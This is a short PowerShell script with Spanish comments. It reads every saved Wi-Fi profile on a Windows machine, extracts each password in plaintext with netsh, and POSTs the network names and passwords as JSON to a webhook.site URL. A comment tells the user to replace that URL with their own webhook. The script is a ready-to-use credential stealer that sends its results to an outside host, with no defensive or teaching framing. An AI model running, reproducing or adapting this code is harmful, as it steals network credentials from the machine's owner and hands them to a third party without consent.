# 1. Obtener todos los perfiles de redes Wi-Fi guardadas
$profiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Value.Trim(": ").Trim() }

$wifiData = foreach ($name in $profiles) {
    # 2. Extraer la clave en texto plano para cada perfil
    $pass = netsh wlan show profile name="$name" key=clear | Select-String "Key Content\s+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    
    # 3. Crear un objeto con el Nombre y la Clave
    if ($pass) {
        [PSCustomObject]@{
            SSID     = $name
            Password = $pass
        }
    }
}

# 4. Convertir a JSON y enviar al Webhook
# REEMPLAZA LA URL CON TU WEBHOOK ACTUAL
$webhookUrl = "https://webhook.site/TU_ID_AQUI"
$payload = $wifiData | ConvertTo-Json

Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
